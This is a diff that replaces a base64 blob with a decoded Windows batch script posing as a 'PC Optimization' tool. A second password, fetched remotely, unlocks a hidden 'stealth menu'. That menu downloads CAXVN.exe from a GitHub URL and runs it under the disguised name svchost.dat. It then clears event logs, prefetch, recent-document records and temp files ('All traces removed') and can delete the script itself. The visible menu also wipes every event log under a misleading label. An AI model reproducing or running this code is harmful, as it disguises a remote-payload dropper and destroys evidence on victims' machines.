@@ -1,102 +1,254 @@
-QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KCjo6IFJlbW90ZSBzdGVh
-bHRoIHBhc3N3b3JkIFVSTApzZXQgIlNURUFMVEhfUEFTU19VUkw9aHR0cHM6Ly9yYXcuZ2l0aHVi
-dXNlcmNvbnRlbnQuY29tL21heHlwcmltZS9wYW5lbGNvbmZpZy9yZWZzL2hlYWRzL21haW4vc3Rl
-YWx0aF9wYXNzd29yZC50eHQiCgo6OiBVUkwgdG8gRVhFIGZpbGUgKENBWFZOLmV4ZSkgb24gR2l0
-SHViCnNldCAiRVhFX1VSTD1odHRwczovL2dpdGh1Yi5jb20vbWF4eXByaW1lL3BhbmVsY29uZmln
-L3Jhdy9yZWZzL2hlYWRzL21haW4vQ0FYVk4uZXhlIgoKOjogTG9jYWwgdGVtcCBwYXRocwpzZXQg
-IlNFVFVQX0VYRT0ldGVtcCVcQ0FYVk4uZXhlIgpzZXQgIkRJU0dVSVNFRF9FWEU9JXRlbXAlXHN2
-Y2hvc3QuZGF0IgoKOkxPR0lOCmNscwplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PQplY2hvICAgICAgICAgICAgUEMgT3B0aW1pemF0aW9uCmVjaG8gICAgICAg
-RGV2ZWxvcGVkIGJ5IE1heHlQcmltZQplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PQplY2hvLgpzZXQgL3AgdXNlcnBhc3M9RW50ZXIgeW91ciBwYXNzd29yZDog
-CgppZiAiJXVzZXJwYXNzJSI9PSIxIiAoCiAgICBnb3RvIE9QVElNSVpBVElPTl9NRU5VCikgZWxz
-ZSAoCiAgICBjYWxsIDpDaGVja1N0ZWFsdGhQYXNzd29yZCAiJXVzZXJwYXNzJSIKICAgIGlmIGVy
-cm9ybGV2ZWwgMSAoCiAgICAgICAgZWNobyBJbmNvcnJlY3QgcGFzc3dvcmQuIFRyeSBhZ2Fpbi4K
-ICAgICAgICB0aW1lb3V0IC90IDIgL25vYnJlYWsgPm51bAogICAgICAgIGdvdG8gTE9HSU4KICAg
-ICkgZWxzZSAoCiAgICAgICAgZ290byBTVEVBTFRIX01FTlUKICAgICkKKQoKZ290byBMT0dJTgoK
-OkNoZWNrU3RlYWx0aFBhc3N3b3JkCnNldCAiaW5wdXRwYXNzPSV-MSIKZm9yIC9mICJ1c2ViYWNr
-cSBkZWxpbXM9IiAlJUEgaW4gKGBwb3dlcnNoZWxsIC1Db21tYW5kICIoSW52b2tlLVdlYlJlcXVl
-c3QgLVVyaSAnJVNURUFMVEhfUEFTU19VUkwlJyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50LlRy
-aW0oKSJgKSBkbyBzZXQgInJlbW90ZV9wYXNzPSUlQSIKaWYgL2kgIiVpbnB1dHBhc3MlIj09IiVy
-ZW1vdGVfcGFzcyUiICgKICAgIGV4aXQgL2IgMAopIGVsc2UgKAogICAgZXhpdCAvYiAxCikKCjpP
-UFRJTUlaQVRJT05fTUVOVQpjbHMKZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT0KZWNobyAgICAgICAgICAgUEMgT3B0aW1pemF0aW9uIE1lbnUKZWNobyA9PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KZWNobyAxLiBDbGVhbiBSZWdp
-c3RyeSBMb2dzCmVjaG8gMi4gQ2xlYW4gRXZlbnQgTG9ncwplY2hvIDMuIENsZWFyIFRlbXAgRmls
-ZXMKZWNobyA0LiBGbHVzaCBETlMgQ2FjaGUKZWNobyA1LiBDaGVjayBEaXNrIGZvciBFcnJvcnMK
-ZWNobyA2LiBEZWZyYWdtZW50IERpc2sKZWNobyA3LiBTeXN0ZW0gRmlsZSBDaGVja2VyCmVjaG8g
-OC4gUmV0dXJuIHRvIE1haW4gTWVudQplY2hvLgpzZXQgL3Agb3B0Y2hvaWNlPVNlbGVjdCBhbiBv
-cHRpb24gKDEtOCk6CgppZiAiJW9wdGNob2ljZSUiPT0iMSIgZ290byBDTEVBTl9SRUdJU1RSWV9M
-T0dTCmlmICIlb3B0Y2hvaWNlJSI9PSIyIiBnb3RvIENMRUFOX0VWRU5UX0xPR1MKaWYgIiVvcHRj
-aG9pY2UlIj09IjMiIGdvdG8gQ0xFQVJfVEVNUF9GSUxFUwppZiAiJW9wdGNob2ljZSUiPT0iNCIg
-Z290byBGTFVTSF9ETlNfQ0FDSEUKaWYgIiVvcHRjaG9pY2UlIj09IjUiIGdvdG8gQ0hFQ0tfRElT
-SwppZiAiJW9wdGNob2ljZSUiPT0iNiIgZ290byBERUZSQUdNRU5UX0RJU0sKaWYgIiVvcHRjaG9p
-Y2UlIj09IjciIGdvdG8gU1lTVEVNX0ZJTEVfQ0hFQ0tFUgppZiAiJW9wdGNob2ljZSUiPT0iOCIg
-Z290byBMT0dJTgoKZWNobyBJbnZhbGlkIG9wdGlvbi4gVHJ5IGFnYWluLgp0aW1lb3V0IC90IDIg
-L25vYnJlYWsgPm51bApnb3RvIE9QVElNSVpBVElPTl9NRU5VCgo6Q0xFQU5fUkVHSVNUUllfTE9H
-UwplY2hvIENsZWFuaW5nIFJlZ2lzdHJ5IExvZ3MuLi4KZm9yIC9mICJ0b2tlbnM9KiIgJSVHIGlu
-ICgnd2V2dHV0aWwgZWwnKSBkbyAoCiAgICB3ZXZ0dXRpbCBjbCAiJSVHIiAyPm51bAopCmVjaG8g
-UmVnaXN0cnkgbG9ncyBjbGVhcmVkLgpwYXVzZQpnb3RvIE9QVElNSVpBVElPTl9NRU5VCgo6Q0xF
-QU5fRVZFTlRfTE9HUwplY2hvIENsZWFuaW5nIEV2ZW50IExvZ3MuLi4KZm9yIC9mICJ0b2tlbnM9
-KiIgJSVHIGluICgnd2V2dHV0aWwgZWwnKSBkbyAoCiAgICB3ZXZ0dXRpbCBjbCAiJSVHIiAyPm51
-bAopCmVjaG8gRXZlbnQgbG9ncyBjbGVhcmVkLgpwYXVzZQpnb3RvIE9QVElNSVpBVElPTl9NRU5V
-Cgo6Q0xFQVJfVEVNUF9GSUxFUwplY2hvIENsZWFyaW5nIFRlbXAgRmlsZXMuLi4KZGVsIC9zIC9x
-ICIldGVtcCVcKi4qIiA-bnVsIDI-JjEKZGVsIC9zIC9xICJDOlxXaW5kb3dzXFRlbXBcKi4qIiA-
-bnVsIDI-JjEKZWNobyBUZW1wIGZpbGVzIGNsZWFyZWQuCnBhdXNlCmdvdG8gT1BUSU1JWkFUSU9O
-X01FTlUKCjpGTFVTSF9ETlNfQ0FDSEUKZWNobyBGbHVzaGluZyBETlMgQ2FjaGUuLi4KaXBjb25m
-aWcgL2ZsdXNoZG5zCmVjaG8gRE5TIENhY2hlIGZsdXNoZWQuCnBhdXNlCmdvdG8gT1BUSU1JWkFU
-SU9OX01FTlUKCjpDSEVDS19ESVNLCmVjaG8gQ2hlY2tpbmcgRGlzayBmb3IgRXJyb3JzLi4uCmNo
-a2RzayBDOiAvZiAvcgpwYXVzZQpnb3RvIE9QVElNSVpBVElPTl9NRU5VCgo6REVGUkFHTUVOVF9E
-SVNLCmVjaG8gRGVmcmFnbWVudGluZyBDOiBkcml2ZS4uLgpkZWZyYWcgQzogL1UgL1YKcGF1c2UK
-Z290byBPUFRJTUlaQVRJT05fTUVOVQoKOlNZU1RFTV9GSUxFX0NIRUNLRVIKZWNobyBSdW5uaW5n
-IFN5c3RlbSBGaWxlIENoZWNrZXIuLi4Kc2ZjIC9zY2Fubm93CnBhdXNlCmdvdG8gT1BUSU1JWkFU
-SU9OX01FTlUKCjpTVEVBTFRIX01FTlUKY2xzCmVjaG8gID09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT0KZWNoby4KZWNobyAgICAgICAgICAgICAqKiogU1RFQUxUSCBN
-RU5VICoqKgplY2hvICAgICAgICAgIEF1dGhvcml6ZWQgUGVyc29ubmVsIE9ubHkKZWNoby4KZWNo
-byAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQplY2hvLgplY2hv
-ICAxLiBTZXR1cAplY2hvICAyLiBSdW4KZWNobyAgMy4gQnlwYXNzCmVjaG8gIDQuIEFsZXJ0IHRo
-ZSBBZG1pbiAhISEKZWNobyAgNS4gRXhpdAplY2hvICA2LiBTZWxmLURlc3RydWN0IFN0ZWFsdGgg
-TWVudQplY2hvLgpzZXQgL3AgY2hvaWNlPUNob29zZSBhbiBvcHRpb246IAoKaWYgIiVjaG9pY2Ul
-Ij09IjEiIGdvdG8gU0VUVVAKaWYgIiVjaG9pY2UlIj09IjIiIGdvdG8gUlVOCmlmICIlY2hvaWNl
-JSI9PSIzIiBnb3RvIEJZUEFTUwppZiAiJWNob2ljZSUiPT0iNCIgZ290byBBTEVSVF9BRE1JTgpp
-ZiAiJWNob2ljZSUiPT0iNSIgZ290byBFWElUCmlmICIlY2hvaWNlJSI9PSI2IiBnb3RvIFNFTEZf
-REVTVFJVQ1QKCmVjaG8gSW52YWxpZCBjaG9pY2UuIFRyeSBhZ2Fpbi4KdGltZW91dCAvdCAyIC9u
-b2JyZWFrID5udWwKZ290byBTVEVBTFRIX01FTlUKCjpTRVRVUAplY2hvIFNURVAgMTogUHJlcGFy
-aW5nIGRvd25sb2FkLi4uCnRpbWVvdXQgL3QgMSA-bnVsCmVjaG8gU1RFUCAyOiBDb25uZWN0aW5n
-IHRvIEdpdEh1Yi4uLgp0aW1lb3V0IC90IDEgPm51bAplY2hvIFNURVAgMzogRG93bmxvYWRpbmcg
-cGF5bG9hZCAoQ0FYVk4uZXhlKS4uLgpwb3dlcnNoZWxsIC1Db21tYW5kICIkY2xpZW50ID0gTmV3
-LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsgJGNsaWVudC5Eb3dubG9hZEZpbGUoJyVFWEVf
-VVJMJScsICclU0VUVVBfRVhFJScpIgoKaWYgZXhpc3QgIiVTRVRVUF9FWEUlIiAoCiAgICBlY2hv
-IERvd25sb2FkIHN1Y2Nlc3NmdWwuCikgZWxzZSAoCiAgICBlY2hvIEZhaWxlZCB0byBkb3dubG9h
-ZCBFWEUuCiAgICBwYXVzZQogICAgZ290byBTVEVBTFRIX01FTlUKKQpwYXVzZQpnb3RvIFNURUFM
-VEhfTUVOVQoKOlJVTgplY2hvIFByZXBhcmluZyBkaXNndWlzZWQgRVhFLi4uCgppZiBub3QgZXhp
-c3QgIiVTRVRVUF9FWEUlIiAoCiAgICBlY2hvIEVYRSBub3QgZm91bmQuIFBsZWFzZSBydW4gU2V0
-dXAgZmlyc3QuCiAgICBwYXVzZQogICAgZ290byBTVEVBTFRIX01FTlUKKQoKY29weSAvWSAiJVNF
-VFVQX0VYRSUiICIlRElTR1VJU0VEX0VYRSUiID5udWwgMj4mMQpzdGFydCAiIiAvYiAiJURJU0dV
-SVNFRF9FWEUlIgoKOldBSVRfTE9PUAp0aW1lb3V0IC90IDIgPm51bAp0YXNrbGlzdCAvRkkgIklN
-QUdFTkFNRSBlcSBzdmNob3N0LmRhdCIgfCBmaW5kIC9JICJzdmNob3N0LmRhdCIgPm51bAppZiBu
-b3QgZXJyb3JsZXZlbCAxICgKICAgIGdvdG8gV0FJVF9MT09QCikKCmRlbCAvZiAvcSAiJURJU0dV
-SVNFRF9FWEUlIiA-bnVsIDI-JjEKZWNobyBFWEUgcnVuIGNvbXBsZXRlZCBhbmQgY2xlYW5lZCB1
-cC4KcGF1c2UKZ290byBTVEVBTFRIX01FTlUKCjpCWVBBU1MKZWNobyBSdW5uaW5nIGNsZWFudXAu
-Li4KCjo6IENsZWFyIHJlY2VudCBmaWxlcwpyZWcgZGVsZXRlICJIS0NVXFNvZnR3YXJlXE1pY3Jv
-c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJlY2VudERvY3MiIC9mID5udWwg
-Mj4mMQoKOjogQ2xlYXIgcHJlZmV0Y2ggZmlsZXMKZGVsIC9xIC9mIC9zICIlU3lzdGVtUm9vdCVc
-UHJlZmV0Y2hcKi4qIiA-bnVsIDI-JjEKCjo6IENsZWFyIHRlbXAgZmlsZXMKZGVsIC9zIC9xICIl
-dGVtcCVcKi4qIiA-bnVsIDI-JjEKZGVsIC9zIC9xICJDOlxXaW5kb3dzXFRlbXBcKi4qIiA-bnVs
-IDI-JjEKCjo6IENsZWFyIGV2ZW50IGxvZ3MKZm9yIC9mICJ0b2tlbnM9KiIgJSVHIGluICgnd2V2
-dHV0aWwgZWwnKSBkbyAoCiAgICB3ZXZ0dXRpbCBjbCAiJSVHIiAyPm51bAopCgo6OiBGbHVzaCBE
-TlMKaXBjb25maWcgL2ZsdXNoZG5zID5udWwKCjo6IENsZWFyIGNsaXBib2FyZAplY2hvIG9mZiB8
-IGNsaXAKCmVjaG8gQ2xlYW51cCBkb25lLiBBbGwgdHJhY2VzIHJlbW92ZWQuCnBhdXNlCmdvdG8g
-U1RFQUxUSF9NRU5VCgo6QUxFUlRfQURNSU4KY2xzCmVjaG8gRW50ZXIgeW91ciBhbGVydCBtZXNz
-YWdlIChtYXggMjAgd29yZHMpOgpzZXQgL3AgYWxlcnRtc2c9IAplY2hvIFlvdSBlbnRlcmVkOiAl
-YWxlcnRtc2clCmVjaG8gKEZlYXR1cmUgdG8gc2VuZCBtZXNzYWdlIG5vdCBpbXBsZW1lbnRlZCB5
-ZXQpCnBhdXNlCmdvdG8gU1RFQUxUSF9NRU5VCgo6RVhJVApleGl0Cgo6U0VMRl9ERVNUUlVDVApl
-Y2hvIEluaXRpYXRpbmcgU2VsZi1EZXN0cnVjdC4uLgp0aW1lb3V0IC90IDEgPm51bAoKOjogRGVs
-ZXRlIGRvd25sb2FkZWQgRVhFIGFuZCBkaXNndWlzZWQgZmlsZQpkZWwgL2YgL3EgIiVTRVRVUF9F
-WEUlIiA-bnVsIDI-JjEKZGVsIC9mIC9xICIlRElTR1VJU0VEX0VYRSUiID5udWwgMj4mMQoKOjog
-RGVsZXRlIHRoaXMgYmF0Y2ggZmlsZSB1c2luZyBWQlMKc2V0ICJCQVRGSUxFPSV-ZjAiCmVjaG8g
-U2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKSA-ICIl
-dGVtcCVcZGVsZXRlX21lLnZicyIKZWNobyBmc28uRGVsZXRlRmlsZSAiJUJBVEZJTEUlIiwgVHJ1
-ZSA-PiAiJXRlbXAlXGRlbGV0ZV9tZS52YnMiCnN0YXJ0IC9taW4gIiIgIiV0ZW1wJVxkZWxldGVf
-bWUudmJzIgp0aW1lb3V0IC90IDIgPm51bApkZWwgIiV0ZW1wJVxkZWxldGVfbWUudmJzIiA-bnVs
-IDI-JjEKCmV4aXQK
+@echo off
+setlocal enabledelayedexpansion
+
+:: Remote stealth password URL
+set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
+
+:: URL to EXE file (CAXVN.exe) on GitHub
+set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
+
+:: Local temp paths
+set "SETUP_EXE=%temp%\CAXVN.exe"
+set "DISGUISED_EXE=%temp%\svchost.dat"
+
+:LOGIN
+cls
+echo ==========================================
+echo            PC Optimization
+echo       Developed by MaxyPrime
+echo ==========================================
+echo.
+set /p userpass=Enter your password: 
+
+if "%userpass%"=="1" (
+    goto OPTIMIZATION_MENU
+) else (
+    call :CheckStealthPassword "%userpass%"
+    if errorlevel 1 (
+        echo Incorrect password. Try again.
+        timeout /t 2 /nobreak >nul
+        goto LOGIN
+    ) else (
+        goto STEALTH_MENU
+    )
+)
+
+goto LOGIN
+
+:CheckStealthPassword
+set "inputpass=%~1"
+for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
+if /i "%inputpass%"=="%remote_pass%" (
+    exit /b 0
+) else (
+    exit /b 1
+)
+
+:OPTIMIZATION_MENU
+cls
+echo ==========================================
+echo           PC Optimization Menu
+echo ==========================================
+echo 1. Clean Registry Logs
+echo 2. Clean Event Logs
+echo 3. Clear Temp Files
+echo 4. Flush DNS Cache
+echo 5. Check Disk for Errors
+echo 6. Defragment Disk
+echo 7. System File Checker
+echo 8. Return to Main Menu
+echo.
+set /p optchoice=Select an option (1-8):
+
+if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
+if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
+if "%optchoice%"=="3" goto CLEAR_TEMP_FILES
+if "%optchoice%"=="4" goto FLUSH_DNS_CACHE
+if "%optchoice%"=="5" goto CHECK_DISK
+if "%optchoice%"=="6" goto DEFRAGMENT_DISK
+if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
+if "%optchoice%"=="8" goto LOGIN
+
+echo Invalid option. Try again.
+timeout /t 2 /nobreak >nul
+goto OPTIMIZATION_MENU
+
+:CLEAN_REGISTRY_LOGS
+echo Cleaning Registry Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+echo Registry logs cleared.
+pause
+goto OPTIMIZATION_MENU
+
+:CLEAN_EVENT_LOGS
+echo Cleaning Event Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+echo Event logs cleared.
+pause
+goto OPTIMIZATION_MENU
+
+:CLEAR_TEMP_FILES
+echo Clearing Temp Files...
+del /s /q "%temp%\*.*" >nul 2>&1
+del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
+echo Temp files cleared.
+pause
+goto OPTIMIZATION_MENU
+
+:FLUSH_DNS_CACHE
+echo Flushing DNS Cache...
+ipconfig /flushdns
+echo DNS Cache flushed.
+pause
+goto OPTIMIZATION_MENU
+
+:CHECK_DISK
+echo Checking Disk for Errors...
+chkdsk C: /f /r
+pause
+goto OPTIMIZATION_MENU
+
+:DEFRAGMENT_DISK
+echo Defragmenting C: drive...
+defrag C: /U /V
+pause
+goto OPTIMIZATION_MENU
+
+:SYSTEM_FILE_CHECKER
+echo Running System File Checker...
+sfc /scannow
+pause
+goto OPTIMIZATION_MENU
+
+:STEALTH_MENU
+cls
+echo  ===========================================
+echo.
+echo             *** STEALTH MENU ***
+echo          Authorized Personnel Only
+echo.
+echo  ===========================================
+echo.
+echo  1. Setup
+echo  2. Run
+echo  3. Bypass
+echo  4. Alert the Admin !!!
+echo  5. Exit
+echo  6. Self-Destruct Stealth Menu
+echo.
+set /p choice=Choose an option: 
+
+if "%choice%"=="1" goto SETUP
+if "%choice%"=="2" goto RUN
+if "%choice%"=="3" goto BYPASS
+if "%choice%"=="4" goto ALERT_ADMIN
+if "%choice%"=="5" goto EXIT
+if "%choice%"=="6" goto SELF_DESTRUCT
+
+echo Invalid choice. Try again.
+timeout /t 2 /nobreak >nul
+goto STEALTH_MENU
+
+:SETUP
+echo STEP 1: Preparing download...
+timeout /t 1 >nul
+echo STEP 2: Connecting to GitHub...
+timeout /t 1 >nul
+echo STEP 3: Downloading payload (CAXVN.exe)...
+powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+
+if exist "%SETUP_EXE%" (
+    echo Download successful.
+) else (
+    echo Failed to download EXE.
+    pause
+    goto STEALTH_MENU
+)
+pause
+goto STEALTH_MENU
+
+:RUN
+echo Preparing disguised EXE...
+
+if not exist "%SETUP_EXE%" (
+    echo EXE not found. Please run Setup first.
+    pause
+    goto STEALTH_MENU
+)
+
+copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
+start "" /b "%DISGUISED_EXE%"
+
+:WAIT_LOOP
+timeout /t 2 >nul
+tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
+if not errorlevel 1 (
+    goto WAIT_LOOP
+)
+
+del /f /q "%DISGUISED_EXE%" >nul 2>&1
+echo EXE run completed and cleaned up.
+pause
+goto STEALTH_MENU
+
+:BYPASS
+echo Running cleanup...
+
+:: Clear recent files
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
+
+:: Clear prefetch files
+del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
+
+:: Clear temp files
+del /s /q "%temp%\*.*" >nul 2>&1
+del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
+
+:: Clear event logs
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+
+:: Flush DNS
+ipconfig /flushdns >nul
+
+:: Clear clipboard
+echo off | clip
+
+echo Cleanup done. All traces removed.
+pause
+goto STEALTH_MENU
+
+:ALERT_ADMIN
+cls
+echo Enter your alert message (max 20 words):
+set /p alertmsg= 
+echo You entered: %alertmsg%
+echo (Feature to send message not implemented yet)
+pause
+goto STEALTH_MENU
+
+:EXIT
+exit
+
+:SELF_DESTRUCT
+echo Initiating Self-Destruct...
+timeout /t 1 >nul
+
+:: Delete downloaded EXE and disguised file
+del /f /q "%SETUP_EXE%" >nul 2>&1
+del /f /q "%DISGUISED_EXE%" >nul 2>&1
+
+:: Delete this batch file using VBS
+set "BATFILE=%~f0"
+echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
+echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
+start /min "" "%temp%\delete_me.vbs"
+timeout /t 2 >nul
+del "%temp%\delete_me.vbs" >nul 2>&1
+
+exit
